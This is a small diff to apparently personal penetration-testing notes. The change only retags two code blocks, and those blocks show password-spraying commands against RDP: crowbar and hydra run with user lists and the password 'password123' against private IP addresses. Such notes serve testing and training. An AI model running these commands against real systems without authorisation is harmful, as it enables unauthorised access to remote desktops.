@@ -2,11 +2,11 @@
 
 ### Password guessing 
 #### Using [crowbar](https://github.com/galkan/crowbar)
-```shell-session
+```shell
 crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
 ```
 #### #Hydra 
-```shell-session
+```shell
  hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ```
 
